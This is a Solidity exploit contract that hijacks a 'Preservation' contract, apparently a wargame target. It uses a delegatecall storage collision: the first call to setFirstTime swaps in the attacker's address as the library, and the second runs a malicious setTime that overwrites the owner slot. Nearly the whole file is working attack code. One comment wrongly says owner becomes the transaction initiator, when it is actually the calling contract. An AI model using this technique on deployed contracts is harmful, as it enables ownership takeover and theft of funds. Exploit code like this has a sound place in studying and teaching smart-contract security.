// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation{
    function setFirstTime(uint _timeStamp) external;
}

contract Attack {
    // make sure the storage layout is the same as Preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    IPreservation victim;
    constructor(address _victim) {
        victim = IPreservation(_victim); // initilizating the victim interface
    }
    
    function attack() public {
        // override the address of timeZone1Library to this address
        victim.setFirstTime(uint(uint160(address(this))));
        // input a ramdon number but this time delegate call to our attack contract
        victim.setFirstTime(1);
    }

    function setTime(uint _time) public  { // make sure this is the same function selector as defined in library contract
        owner = msg.sender; // set the owner equal to the transaction initialzer 
    }

}
